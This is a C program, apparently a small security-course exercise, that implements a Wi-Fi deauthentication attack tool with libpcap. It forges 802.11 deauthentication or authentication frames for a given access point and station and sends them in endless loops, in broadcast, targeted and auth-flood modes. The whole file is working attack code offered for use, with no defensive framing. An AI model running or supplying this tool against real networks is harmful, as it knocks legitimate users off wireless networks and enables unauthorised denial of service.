#include "packet.h"
pcap_t* pcap;
void send_broadcast(char * ap){
    u_int8_t temp[6];
    deauth_packet appk;
    memset(&appk,0x00,sizeof(deauth_packet));
    appk.length =  0xb;
    appk.flag = 0x00028000;
    appk.frame_control = 0xc0;
    memset(appk.dest_addr, 0xff,6);
    sscanf(ap,"%2X:%2X:%2X:%2X:%2X:%2X",&temp[0],&temp[1],&temp[2],&temp[3],&temp[4],&temp[5]);
    memcpy(appk.src_addr,temp,6);
    memcpy(appk.bssid,temp,6);
    appk.fixed_parameter = 0x0007;
    while(1){
        if (pcap_sendpacket(pcap, (unsigned char*)&appk, sizeof(appk)) != 0){
            printf("Fail send_packet\n");
            exit (-1);
        }else{
            printf("send appk!\n");
        }
        sleep(0.5);
    }
}

void send_auth(char * ap, char * st){
    u_int8_t temp[6];
    auth_packet aupk;
    memset(&aupk,0x00,sizeof(deauth_packet));
    aupk.length =  0xb;
    aupk.flag = 0x00028000;
    aupk.frame_control = 0xb0;
    sscanf(ap,"%2X:%2X:%2X:%2X:%2X:%2X",&temp[0],&temp[1],&temp[2],&temp[3],&temp[4],&temp[5]);
    memcpy(aupk.dest_addr,temp,6);
    memcpy(aupk.bssid,temp,6);
    sscanf(st,"%2X:%2X:%2X:%2X:%2X:%2X",&temp[0],&temp[1],&temp[2],&temp[3],&temp[4],&temp[5]);
    memcpy(aupk.src_addr,temp,6);
    //aupk.sequence_number = 0x05d8;
    aupk.farg1 = 0x0000;
    aupk.farg2 = 0x0001;
    aupk.farg3 = 0x0000;

    while(1){
        if (pcap_sendpacket(pcap,(unsigned char*)&aupk, sizeof(aupk)) != 0){
            printf("Fail send_packet\n");
            exit (-1);
        }else{
            printf("send aupk!\n");
        }
        //sleep(0.5);
    }
}

void send_st(char * ap, char *st){
    u_int8_t temp[6];
    deauth_packet appk,stpk;
    memset(&appk,0x00,sizeof(deauth_packet));
    memset(&stpk,0x00,sizeof(deauth_packet));
    
    appk.length =  0xb;
    stpk.length =  0xb;

    appk.flag = 0x00028000;
    stpk.flag = 0x00028000;

    appk.frame_control = 0xc0;
    stpk.frame_control = 0xc0;

    sscanf(ap,"%2X:%2X:%2X:%2X:%2X:%2X",&temp[0],&temp[1],&temp[2],&temp[3],&temp[4],&temp[5]);
    memcpy(appk.src_addr,temp,6);
    memcpy(appk.bssid,temp,6);
    memcpy(stpk.bssid,temp,6);
    memcpy(stpk.dest_addr,temp,6);
    sscanf(st,"%2X:%2X:%2X:%2X:%2X:%2X",&temp[0],&temp[1],&temp[2],&temp[3],&temp[4],&temp[5]);
    memcpy(stpk.src_addr,temp,6);
    memcpy(appk.dest_addr,temp,6);

    appk.fixed_parameter = 0x0007;
    stpk.fixed_parameter = 0x0007;
    while(1){
        if (pcap_sendpacket(pcap, (unsigned char*)&appk, sizeof(appk)) != 0){
            printf("Fail send_packet\n");
            exit (-1);
        }else{
            printf("send appk!\n");
        }
        if (pcap_sendpacket(pcap, (unsigned char*)&stpk, sizeof(stpk)) != 0){
            printf("Fail send_packet\n");
            exit (-1);
        }else{
            printf("send stpk!\n");
        }
        sleep(0.5);
    }
}

int main(int argc, char* argv[]){
    if( argc < 3 || argc > 5){
        printf("usage : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
        exit(-1);
    }
    uint8_t errbuf[PCAP_ERRBUF_SIZE];
    char * interface_;
    interface_ = argv[1];
    pcap = pcap_open_live(interface_ , BUFSIZ, 1, 1000, errbuf);
    
    
    if (pcap == 0 ){
        printf("Error ! \n");
        exit(-1);
    }
    if (argc == 3){
        send_broadcast(argv[2]);
    }else if (argc > 3 ){
        if(argc == 5 && !strncmp(argv[4],"-auth",5)){
            send_auth(argv[2],argv[3]);
        }else{
            send_st(argv[2],argv[3]);
        }
    }
    
    
}
